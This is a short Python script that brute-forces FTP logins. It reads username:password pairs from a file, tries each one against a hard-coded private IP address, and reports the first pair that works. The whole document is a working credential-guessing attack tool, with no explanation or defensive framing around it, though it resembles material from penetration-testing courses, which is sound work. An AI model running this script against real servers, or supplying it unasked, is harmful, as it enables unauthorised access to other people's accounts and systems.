''' brute force login'''
import ftplib

def brute_login(hostname, passwd_file):
    pf = open(passwd_file, 'r')
    for line in pf.readlines():
        userName = line.split(':')[0]
        passWord = line.split(':')[1].strip('\r').strip('\n')
        print('[+] Trying: ' + userName + '/' + passWord)
        try:
            ftp = ftplib.FTP(hostname)
            ftp.login(userName, passWord)
            print('\n[*] ' + str(hostname) + ' FTP Logon Succeeded: ' + userName + '/' + passWord)
            ftp.quit()
            return (userName, passWord)
        except Exception as e:
            pass
    print('\n[-] Could not brute force FTP credentials.')
    return (None, None)

def main():
    ''' main '''
    host = '192.168.95.179'
    passwd_file = 'userpass.txt'
    brute_login(host, passwd_file)

if __name__ == '__main__':
    main()
